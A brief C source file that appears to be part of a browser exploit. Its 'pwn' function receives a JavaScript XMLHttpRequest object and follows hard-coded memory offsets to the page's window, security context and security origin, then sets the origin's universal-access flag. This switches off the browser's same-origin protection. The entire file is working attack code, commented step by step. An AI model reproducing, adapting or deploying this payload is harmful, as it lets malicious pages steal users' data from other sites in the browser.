#include "sasm.h"

char js_buffer[32];

EXPORT(pwn)(V8 arg) {
    //asm("int3");
    char* js_xhr = V8_ARG_TO_PTR(arg);
    // Grab xhr from js_xhr
    char* xhr = *(char**)(js_xhr + 20);

    // Grab LocalDOMWindow from the xhr object
    char* local_window = *(char**)(xhr + 0x68) - 0x20;

    // Grab Security Context from LocalDOMWindow / ExecutionContext
    char* sec_ctx = (char**)(local_window + 0x48);

    // Grab Security Origin from the Security Context
    char* sec_org = *(char**)(sec_ctx + 0x10);

    // Set m_universal_access
    *(sec_org + 0x40) = 1;
    return NOP();
}
    //char* sec_ctx = *(char**)(local_window + 0x120) + 0x110;
